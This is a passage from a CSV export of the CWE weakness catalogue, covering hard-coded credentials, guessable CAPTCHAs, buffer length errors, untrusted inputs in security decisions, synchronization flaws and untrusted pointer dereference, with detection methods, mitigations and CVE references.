authentication routine typically involves an account that is not visible outside of the code.:EFFECTIVENESS:Moderate::METHOD:Automated Static Analysis:DESCRIPTION:Automated white box techniques have been published for detecting hard-coded credentials for incoming authentication, but there is some expert disagreement regarding their effectiveness and applicability to a broad range of methods.::METHOD:Manual Static Analysis:DESCRIPTION:This weakness may be detectable using manual code analysis. Unless authentication is decentralized and applied throughout the product, there can be sufficient time for the analyst to find incoming authentication routines and examine the program logic looking for usage of hard-coded credentials. Configuration files could also be analyzed.::METHOD:Manual Dynamic Analysis:DESCRIPTION:For hard-coded credentials in incoming authentication: use monitoring tools that examine the product's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the product was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic. Attach the monitor to the process and perform a login. Using call trees or similar artifacts from the output, examine the associated behaviors and see if any of them appear to be comparing the input to a fixed string or value.::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Network Sniffer Forced Path Execution:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Automated Static Analysis:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Configuration Checker:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.) Formal Methods / Correct-By-Construction:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:For outbound authentication: store passwords, keys, and other credentials outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible [REF-7]. In Windows environments, the Encrypted File System (EFS) may provide some protection.::PHASE:Architecture and Design:DESCRIPTION:For inbound authentication: Rather than hard-code a default username and password, key, or other authentication credentials for first time logins, utilize a first login mode that requires the user to enter a unique strong password or key.::PHASE:Architecture and Design:DESCRIPTION:If the product must contain hard-coded credentials or they cannot be removed, perform access control checks and limit which entities can access the feature that requires the hard-coded credentials. For example, a feature might only be enabled through the system console instead of through a network connection.::PHASE:Architecture and Design:DESCRIPTION:For inbound authentication using passwords: apply strong one-way hashes to passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When handling an incoming password during authentication, take the hash of the password and compare it to the saved hash. Use randomly assigned salts for each separate hash that is generated. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.::PHASE:Architecture and Design:DESCRIPTION:For front-end to back-end connections: Three solutions are possible, although none are complete. The first suggestion involves the use of generated passwords or keys that are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals. Next, the passwords or keys should be limited at the back end to only performing actions valid for the front end, as opposed to having full access. Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay-style attacks.::\",\"::REFERENCE:CVE-2022-29953:DESCRIPTION:Condition Monitor firmware has a maintenance interface with hard-coded credentials:LINK:https://www.cve.org/CVERecord?id=CVE-2022-29953::REFERENCE:CVE-2022-29960:DESCRIPTION:Engineering Workstation uses hard-coded cryptographic keys that could allow for unathorized filesystem access and privilege escalation:LINK:https://www.cve.org/CVERecord?id=CVE-2022-29960::REFERENCE:CVE-2022-29964:DESCRIPTION:Distributed Control System (DCS) has hard-coded passwords for local shell access:LINK:https://www.cve.org/CVERecord?id=CVE-2022-29964::REFERENCE:CVE-2022-30997:DESCRIPTION:Programmable Logic Controller (PLC) has a maintenance service that uses undocumented, hard-coded credentials:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30997::REFERENCE:CVE-2022-30314:DESCRIPTION:Firmware for a Safety Instrumented System (SIS) has hard-coded credentials for access to boot configuration:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30314::REFERENCE:CVE-2022-30271:DESCRIPTION:Remote Terminal Unit (RTU) uses a hard-coded SSH private key that is likely to be used in typical deployments:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30271::REFERENCE:CVE-2021-37555:DESCRIPTION:Telnet service for IoT feeder for dogs and cats has hard-coded password [REF-1288]:LINK:https://www.cve.org/CVERecord?id=CVE-2021-37555::REFERENCE:CVE-2021-35033:DESCRIPTION:Firmware for a WiFi router uses a hard-coded password for a BusyBox shell, allowing bypass of authentication through the UART port:LINK:https://www.cve.org/CVERecord?id=CVE-2021-35033::REFERENCE:CVE-2012-3503:DESCRIPTION:Installation script has a hard-coded secret token value, allowing attackers to bypass authentication:LINK:https://www.cve.org/CVERecord?id=CVE-2012-3503::REFERENCE:CVE-2010-2772:DESCRIPTION:SCADA system uses a hard-coded password to protect back-end database containing authorization information, exploited by Stuxnet worm:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2772::REFERENCE:CVE-2010-2073:DESCRIPTION:FTP server library uses hard-coded usernames and passwords for three default accounts:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2073::REFERENCE:CVE-2010-1573:DESCRIPTION:Chain: Router firmware uses hard-coded username and password for access to debug functionality, which can be used to execute arbitrary code:LINK:https://www.cve.org/CVERecord?id=CVE-2010-1573::REFERENCE:CVE-2008-2369:DESCRIPTION:Server uses hard-coded authentication key:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2369::REFERENCE:CVE-2008-0961:DESCRIPTION:Backup product uses hard-coded username and password, allowing attackers to bypass authentication via the RPC interface:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0961::REFERENCE:CVE-2008-1160:DESCRIPTION:Security appliance uses hard-coded password allowing attackers to gain root access:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1160::REFERENCE:CVE-2006-7142:DESCRIPTION:Drive encryption product stores hard-coded cryptographic keys for encrypted configuration files in executable programs:LINK:https://www.cve.org/CVERecord?id=CVE-2006-7142::REFERENCE:CVE-2005-3716:DESCRIPTION:VoIP product uses hard-coded public credentials that cannot be changed, which allows attackers to obtain sensitive information:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3716::REFERENCE:CVE-2005-3803:DESCRIPTION:VoIP product uses hard coded public and private SNMP community strings that cannot be changed, which allows remote attackers to obtain sensitive information:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3803::REFERENCE:CVE-2005-0496:DESCRIPTION:Backup product contains hard-coded credentials that effectively serve as a back door, which allows remote attackers to access the file system:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0496::\",,,\"::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:MSC03-J:ENTRY NAME:Never hard code sensitive information::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-798::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 1.5::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 1.5::\",::191::70::,\"::TYPE:Maintenance:NOTE:The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the Mapping CWE to 62443 subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.::\",\n804,\"Guessable CAPTCHA\",Base,Incomplete,\"The product uses a CAPTCHA challenge, but the challenge can be guessed or automatically recognized by a non-human actor.\",\"An automated attacker could bypass the intended protection of the CAPTCHA challenge and perform actions at a higher frequency than humanly possible, such as launching spam attacks. There can be several different causes of a guessable CAPTCHA: An audio or visual image that does not have sufficient distortion from the unobfuscated source image. A question is generated with a format that can be automatically recognized, such as a math question. A question for which the number of possible answers is limited, such as birth years or favorite sports teams. A general-knowledge or trivia question for which the answer can be accessed using a data base, such as country capitals or popular entertainers. Other data associated with the CAPTCHA may provide hints about its contents, such as an image whose filename contains the word that is used in the CAPTCHA.\",::NATURE:ChildOf:CWE ID:863:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY NAME:Web Server:TECHNOLOGY PREVALENCE:Sometimes::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:SCOPE:Other:IMPACT:Bypass Protection Mechanism:IMPACT:Other:NOTE:When authorization, authentication, or another protection mechanism relies on CAPTCHA entities to ensure that only human actors can access certain functionality, then an automated attacker such as a bot may access the restricted functionality by guessing the CAPTCHA.::\",\"\",\"\",\"::REFERENCE:CVE-2022-4036:DESCRIPTION:Chain: appointment booking app uses a weak hash (CWE-328) for generating a CAPTCHA, making it guessable (CWE-804):LINK:https://www.cve.org/CVERecord?id=CVE-2022-4036::\",,,\"::TAXONOMY NAME:WASC:ENTRY ID:21:ENTRY NAME:Insufficient Anti-Automation::\",,\"\",\n805,\"Buffer Access with Incorrect Length Value\",Base,Incomplete,\"The product uses a sequential operation to read or write a buffer, but it uses an incorrect length value that causes it to access memory that is outside of the bounds of the buffer.\",\"When the length value exceeds the size of the destination, a buffer overflow could occur.\",::NATURE:ChildOf:CWE ID:119:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1340:ORDINAL:Primary::,\"::ORDINALITY:Resultant::ORDINALITY:Primary::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Often::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Often::LANGUAGE CLASS:Assembly:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Read Memory:IMPACT:Modify Memory:IMPACT:Execute Unauthorized Code or Commands:NOTE:Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy. This can often be used to subvert any other security service.::SCOPE:Availability:IMPACT:Modify Memory:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Resource Consumption (CPU):NOTE:Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives. Automated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.:EFFECTIVENESS:High::METHOD:Automated Dynamic Analysis:DESCRIPTION:This weakness can be detected using dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.:EFFECTIVENESS:Moderate::METHOD:Manual Analysis:DESCRIPTION:Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large.::\",\"::PHASE:Requirements:STRATEGY:Language Selection:DESCRIPTION:Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer. Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:DESCRIPTION:Consider adhering to the following rules when allocating and managing an application's memory: Double check that the buffer is as large as specified. When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string. Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space. If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as rebasing (for Windows) and prelinking (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].:EFFECTIVENESS:Defense in Depth::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment. For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].:EFFECTIVENESS:Defense in Depth::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the product or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::\",\"::REFERENCE:CVE-2011-1959:DESCRIPTION:Chain: large length value causes buffer over-read (CWE-126):LINK:https://www.cve.org/CVERecord?id=CVE-2011-1959::REFERENCE:CVE-2011-1848:DESCRIPTION:Use of packet length field to make a calculation, then copy into a fixed-size buffer:LINK:https://www.cve.org/CVERecord?id=CVE-2011-1848::REFERENCE:CVE-2011-0105:DESCRIPTION:Chain: retrieval of length value from an uninitialized memory location:LINK:https://www.cve.org/CVERecord?id=CVE-2011-0105::REFERENCE:CVE-2011-0606:DESCRIPTION:Crafted length value in document reader leads to buffer overflow:LINK:https://www.cve.org/CVERecord?id=CVE-2011-0606::REFERENCE:CVE-2011-0651:DESCRIPTION:SSL server overflow when the sum of multiple length fields exceeds a given value:LINK:https://www.cve.org/CVERecord?id=CVE-2011-0651::REFERENCE:CVE-2010-4156:DESCRIPTION:Language interpreter API function doesn't validate length argument, leading to information exposure:LINK:https://www.cve.org/CVERecord?id=CVE-2010-4156::\",,::Memory::,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ARR38-C:ENTRY NAME:Guarantee that library functions do not form invalid pointers:MAPPING FIT:Imprecise::\",::100::256::,\"\",\n807,\"Reliance on Untrusted Inputs in a Security Decision\",Base,Incomplete,\"The product uses a protection mechanism that relies on the existence or values of an input, but the input can be modified by an untrusted actor in a way that bypasses the protection mechanism.\",\"Developers may assume that inputs such as cookies, environment variables, and hidden form fields cannot be modified. However, an attacker could change these inputs using customized clients or other attacks. This change might not be detected. When security decisions such as authentication and authorization are made based on the values of these inputs, attackers can bypass the security of the software. Without sufficient encryption, integrity checking, or other mechanism, any input that originates from an outsider cannot be trusted.\",::NATURE:ChildOf:CWE ID:693:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Availability:SCOPE:Other:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity:IMPACT:Varies by Context:NOTE:Attackers can bypass the security decision to access whatever is being protected. The consequences will depend on the associated functionality, but they can range from granting additional privileges to untrusted users to bypassing important security checks. Ultimately, this weakness may lead to exposure or modification of sensitive data, system crash, or execution of arbitrary code.::\",\"::METHOD:Manual Static Analysis:DESCRIPTION:Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.) Formal Methods / Correct-By-Construction Cost effective for partial coverage: Attack Modeling:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:STRATEGY:Attack Surface Reduction:DESCRIPTION:Store state information and sensitive data on the server side only. Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions. If information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328).::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. With a stateless protocol such as HTTP, use a framework that maintains the state for you. Examples include ASP.NET View State [REF-756] and the OWASP ESAPI Session Management feature [REF-45]. Be careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Operation Implementation:STRATEGY:Environment Hardening:DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::PHASE:Architecture and Design Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls. Identify all inputs that are used for security decisions and determine if you can modify the design so that you do not have to rely on submitted inputs at all. For example, you may be able to keep critical information about the user's session on the server side instead of recording it within external data.::\",\"::REFERENCE:CVE-2009-1549:DESCRIPTION:Attacker can bypass authentication by setting a cookie to a specific value.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1549::REFERENCE:CVE-2009-1619:DESCRIPTION:Attacker can bypass authentication and gain admin privileges by setting an admin cookie to 1.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1619::REFERENCE:CVE-2009-0864:DESCRIPTION:Content management system allows admin privileges by setting a login cookie to OK.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0864::REFERENCE:CVE-2008-5784:DESCRIPTION:e-dating application allows admin privileges by setting the admin cookie to 1.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5784::REFERENCE:CVE-2008-6291:DESCRIPTION:Web-based email list manager allows attackers to gain admin privileges by setting a login cookie to admin.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-6291::\",,,\"::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SEC09-J:ENTRY NAME:Do not base security checks on untrusted sources::\",,\"\",\n820,\"Missing Synchronization\",Base,Incomplete,\"The product utilizes a shared resource in a concurrent manner but does not attempt to synchronize access to the resource.\",\"If access to a shared resource is not synchronized, then the resource may not be in a state that is expected by the product. This might lead to unexpected or insecure behaviors, especially if an attacker can influence the shared resource.\",::NATURE:ChildOf:CWE ID:662:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:662:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:662:VIEW ID:1340:ORDINAL:Primary::,\"\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Other:IMPACT:Modify Application Data:IMPACT:Read Application Data:IMPACT:Alter Execution Logic::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:LCK05-J:ENTRY NAME:Synchronize access to static fields that can be modified by untrusted code::\",,\"::TYPE:Maintenance:NOTE:Deeper research is necessary for synchronization and related mechanisms, including locks, mutexes, semaphores, and other mechanisms. Multiple entries are dependent on this research, which includes relationships to concurrency, race conditions, reentrant functions, etc. CWE-662 and its children - including CWE-667, CWE-820, CWE-821, and others - may need to be modified significantly, along with their relationships.::\",\n821,\"Incorrect Synchronization\",Base,Incomplete,\"The product utilizes a shared resource in a concurrent manner, but it does not correctly synchronize access to the resource.\",\"If access to a shared resource is not correctly synchronized, then the resource may not be in a state that is expected by the product. This might lead to unexpected or insecure behaviors, especially if an attacker can influence the shared resource.\",::NATURE:ChildOf:CWE ID:662:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:662:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:662:VIEW ID:1340:ORDINAL:Primary::,\"\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Other:IMPACT:Modify Application Data:IMPACT:Read Application Data:IMPACT:Alter Execution Logic::\",\"\",\"\",\"\",,,\"\",,\"::TYPE:Maintenance:NOTE:Deeper research is necessary for synchronization and related mechanisms, including locks, mutexes, semaphores, and other mechanisms. Multiple entries are dependent on this research, which includes relationships to concurrency, race conditions, reentrant functions, etc. CWE-662 and its children - including CWE-667, CWE-820, CWE-821, and others - may need to be modified significantly, along with their relationships.::\",\n822,\"Untrusted Pointer Dereference\",Base,Incomplete,\"The product obtains a value from an untrusted source, converts this value to a pointer, and dereferences the resulting pointer.\",\"An attacker can supply a pointer for memory locations that the product is not expecting. If the pointer is dereferenced for a write operation, the attack might allow modification of critical state variables, cause a crash, or execute code. If the dereferencing operation is for a read, then the attack might allow reading of sensitive data, cause a crash, or set a variable to an unexpected value (since the value will be read from an unexpected memory location). There are several variants of this weakness, including but not necessarily limited to: The untrusted value is directly invoked as a function call. In OS kernels or drivers where there is a boundary between userland and privileged memory spaces, an untrusted pointer might enter through an API or system call (see CWE-781 for one such example). Inadvertently accepting the value from an untrusted control sphere when it did not have to be accepted as input at all. This might occur when the code was originally developed to be run by a single user in a non-networked environment, and the code is then ported to or otherwise exposed to a networked environment.\",::NATURE:ChildOf:CWE ID:119:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1340:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:125:VIEW ID:1000::NATURE:CanPrecede:CWE ID:787:VIEW ID:1000::,\"\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:NOTE:If the untrusted pointer is used in a read operation, an attacker might be able to read sensitive portions of memory.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:If the untrusted pointer references a memory location that is not accessible to the product, or points to a location that is malformed or larger than expected by a read or write operation, the application may terminate unexpectedly.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Modify Memory:NOTE:If the untrusted pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible.::\",\"\",\"\",\"::REFERENCE:CVE-2007-5655:DESCRIPTION:message-passing framework interprets values in packets as pointers, causing a crash.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-5655::REFERENCE:CVE-2010-2299:DESCRIPTION:labeled as a type confusion issue, also referred to as a stale pointer. However, the bug ID says contents are simply interpreted as a pointer... renderer ordinarily doesn't supply this pointer directly. The handle in the untrusted area is replaced in one function, but not another - thus also, effectively, exposure to wrong sphere (CWE-668).:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2299::REFERENCE:CVE-2009-1719:DESCRIPTION:Untrusted dereference using undocumented constructor.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1719::REFERENCE:CVE-2009-1250:DESCRIPTION:An error code is incorrectly checked and interpreted as a pointer, leading to a crash.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1250::REFERENCE:CVE-2009-0311:DESCRIPTION:An untrusted value is obtained from a packet and directly called as a function pointer, leading to code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0311::REFERENCE:CVE-2010-1818:DESCRIPTION:Undocumented attribute in multimedia software allows unmarshaling of an untrusted pointer.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-1818::REFERENCE:CVE-2010-3189:DESCRIPTION:ActiveX control for security software accepts a parameter that is assumed to be an initialized pointer.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-3189::REFERENCE:CVE-2010-1253:DESCRIPTION:Spreadsheet software treats certain record values that lead to user-controlled pointer (might be untrusted offset, not untrusted pointer).:LINK:https://www.cve.org/CVERecord?id=CVE-2010-1253::\",,,\"\",::129::,\"::TYPE:Maintenance:NOTE:There are close relationships between incorrect pointer dereferences and other weaknesses related to buffer operations. There may not be sufficient community agreement regarding these relationships. Further study is needed to determine when these relationships are chains, composites, perspective/layering, or other types of relationships. As of September 2010, most of the relationships are being captured as chains.::TYPE:Terminology:NOTE:Many weaknesses related to pointer dereferences fall under the general term of memory corruption or memory safety. As of September 2010, there is no commonly-used terminology that covers the lower-level variants.::\",\n823,\"Use of Out-of-range Pointer Offset\",Base,Incomplete,\"The product performs pointer arithmetic on a valid pointer, but it uses an offset that can point outside of the intended range of valid memory locations for the resulting pointer.\",\"While a pointer can contain a reference to any arbitrary memory location, a program typically only intends to use the pointer to access limited portions of memory, such as contiguous 